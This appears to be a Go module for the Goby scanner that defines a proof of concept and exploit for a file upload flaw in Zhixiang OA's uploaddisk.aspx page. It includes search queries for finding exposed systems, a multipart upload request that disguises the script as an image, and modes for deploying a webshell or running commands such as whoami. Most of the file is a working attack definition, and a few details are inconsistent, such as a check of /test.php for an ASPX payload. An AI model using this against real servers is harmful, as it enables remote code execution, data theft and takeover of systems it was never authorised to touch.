package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Zhixiang OA /DocManage/WorkFlow/uploaddisk.aspx File Upload Vulnerability",
    "Description": "<p>Zhixiang OA system has a file upload vulnerability on the /DocManage/WorkFlow/uploaddisk.aspx page. Attackers can upload specially crafted ASPX files to execute malicious code, achieving remote code execution, which may lead to sensitive information leakage, data tampering, and other serious consequences.</p>",
    "Product": "Zhixiang OA",
    "Homepage": "http://www.zhixiang.com/",
    "DisclosureDate": "2025-01-02",
    "PostTime": "2025-01-02",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"obj.src = \\\"CreateCheckCode.aspx?id\\\"+strMath;\" || body=\"name=\\\"Button1\\\" value=\\\"\\\" onclick=\\\"javascript:return checkfrom();\\\" id=\\\"Button1\\\" class=\\\"loginBtn\\\" />\") || body=\"obj.src =\" && body=\"CreateCheckCode.aspx?id\"",
    "GobyQuery": "(body=\"obj.src = \\\"CreateCheckCode.aspx?id\\\"+strMath;\" || body=\"name=\\\"Button1\\\" value=\\\"\\\" onclick=\\\"javascript:return checkfrom();\\\" id=\\\"Button1\\\" class=\\\"loginBtn\\\" />\") || body=\"obj.src =\" && body=\"CreateCheckCode.aspx?id\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to upload malicious files and execute arbitrary code on the server, potentially leading to full server control, data leakage, and system crashes.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the file upload functionality, strictly restrict the type and content of uploaded files, and prohibit the upload of executable script files. Additionally, upgrade to the latest version and deploy a WAF (Web Application Firewall) to prevent malicious requests.</p>",
    "References": [
        "http://10.10.10.112/zentao/task-view-12191.html?tid=mluil42e"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/DocManage/WorkFlow/uploaddisk.aspx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryElfcTfs456aUZQAZ"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryElfcTfs456aUZQAZ\r\nContent-Disposition: form-data; name=\"EDITFILE\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/png\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryElfcTfs456aUZQAZ--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "致翔 OA /DocManage/WorkFlow/uploaddisk.aspx 文件上传漏洞",
            "Product": "致翔 OA",
            "Description": "<p>致翔 OA 系统在 /DocManage/WorkFlow/uploaddisk.aspx 页面存在文件上传漏洞，攻击者可以通过上传特制的 ASPX 文件，执行恶意代码，从而实现远程代码执行，可能导致敏感信息泄露、数据篡改等严重后果。</p>",
            "Recommendation": "<p>建议立即修复文件上传功能，严格限制上传文件的类型和内容，禁止上传可执行脚本文件。同时，建议升级到最新版本并部署 WAF（Web 应用防火墙）以防止恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者上传恶意文件并在服务器上执行任意代码，可能导致服务器被完全控制，数据泄露和系统崩溃等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Zhixiang OA /DocManage/WorkFlow/uploaddisk.aspx File Upload Vulnerability",
            "Product": "Zhixiang OA",
            "Description": "<p>Zhixiang OA system has a file upload vulnerability on the /DocManage/WorkFlow/uploaddisk.aspx page. Attackers can upload specially crafted ASPX files to execute malicious code, achieving remote code execution, which may lead to sensitive information leakage, data tampering, and other serious consequences.</p>",
            "Recommendation": "<p>It is recommended to immediately fix the file upload functionality, strictly restrict the type and content of uploaded files, and prohibit the upload of executable script files. Additionally, upgrade to the latest version and deploy a WAF (Web Application Firewall) to prevent malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to upload malicious files and execute arbitrary code on the server, potentially leading to full server control, data leakage, and system crashes.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "致翔 OA"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|aspx",
        "FILE_PATH": "define|variable|/{{{FILENAME}}}",
        "VUL_URL": "define|variable|/DocManage/WorkFlow/uploaddisk.aspx"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "FILE_PATH",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9981"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}
